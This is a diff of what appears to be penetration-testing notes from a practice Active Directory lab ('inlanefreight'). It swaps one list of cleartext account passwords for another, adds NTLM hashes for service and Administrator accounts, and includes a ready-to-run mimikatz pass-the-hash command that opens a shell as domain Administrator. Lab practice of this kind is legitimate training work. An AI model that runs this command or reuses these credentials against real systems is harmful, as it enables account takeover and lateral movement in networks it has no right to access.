@@ -1,14 +1,11 @@
-Users:
-wley - transporter@4
-mmorgan@INLANEFREIGHT.LOCAL = Welcome!00
-sgage@inlanefreight.local - Welcome1
-mholliday@inlanefreight.local - Welcome1
-dbranch@inlanefreight.local Winter2022
-database=sa password=ILFREIGHTDB01!
-SAPService - !SapperFi2
-svc_vmwaresso = Virtual01
-adunn:SyncMaster757
-proxyagent:CLEARTEXT:Pr0xy_ILFREIGHT!
-syncron:CLEARTEXT:Mycleart3xtP@ss!
-ygroce:Pass@word
+AB920 - weasal
 
+BR086 - Welcome1
+netdb - D@ta_bAse_adm1n!
+mssqlsvc -8c9555327d95f815987c0d81238c7660
+Administrator bdaffbfe64f1fc646a3353be1c2c3c99
+
+
+mimikatz.exe privilege::debug "sekurlsa::pth /user:Administrator /ntlm:bdaffbfe64f1fc646a3353be1c2c3c99 /domain:inlanefreight.htb /run:cmd.exe" exit
+
+ct059 : charlie1
